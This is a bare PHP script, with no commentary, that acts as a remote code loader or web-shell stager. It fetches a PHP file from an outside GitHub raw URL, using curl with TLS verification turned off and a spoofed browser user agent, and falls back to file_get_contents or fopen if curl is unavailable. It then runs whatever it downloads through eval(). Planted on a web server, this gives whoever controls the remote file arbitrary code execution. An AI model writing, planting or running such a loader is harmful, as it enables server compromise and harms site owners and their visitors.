<?php
session_start();

function geturlsinfo($url) {
    $url_get_contents_data = false;

    if (function_exists('curl_exec')) {
        $conn = curl_init($url);
        curl_setopt($conn, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0"); 
        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, false); 
        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);

        if (isset($_SESSION['so'])) {
            curl_setopt($conn, CURLOPT_COOKIE, $_SESSION['so']); 
        }

        $url_get_contents_data = curl_exec($conn);
        if (curl_errno($conn)) {
            $url_get_contents_data = false; 
        }
        curl_close($conn); 
    } elseif (function_exists('file_get_contents')) {
        $url_get_contents_data = @file_get_contents($url);
    } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
        $handle = @fopen($url, "r");
        if ($handle) {
            $url_get_contents_data = stream_get_contents($handle); 
            fclose($handle);
        }
    }

    return $url_get_contents_data;
}


$a = geturlsinfo('https://raw.githubusercontent.com/niikkita6984/nikita/main/us.php');
if ($a !== false) {
    eval('?>' . $a); 
} else {
    echo "error"; 
}
?>
